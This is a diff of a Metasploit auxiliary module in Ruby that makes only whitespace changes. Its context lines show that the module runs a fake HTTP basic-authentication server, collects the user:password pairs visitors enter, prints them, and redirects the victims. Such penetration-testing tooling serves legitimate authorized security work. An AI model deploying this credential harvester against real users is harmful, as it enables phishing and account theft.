@@ -40,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptPort.new('SRVPORT', [ true, "The local port to listen on.", 80 ]),
         OptString.new('REALM', [ true, "The authentication realm you'd like to present.", "Secure Site" ]),
-        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds"])
+        OptString.new('RedirectURL', [ false, "The page to redirect users to after they enter basic auth creds" ])
       ], self.class)
   end
 
@@ -76,7 +76,7 @@ class Metasploit3 < Msf::Auxiliary
       print_good("#{cli.peerhost} - Credential collected: \"#{user}:#{pass}\" => #{req.resource}")
       if datastore['RedirectURL']
         print_status("Redirecting client #{cli.peerhost} to #{datastore['RedirectURL']}")
-        send_redirect(cli,datastore['RedirectURL'])
+        send_redirect(cli, datastore['RedirectURL'])
       else
         send_not_found(cli)
       end
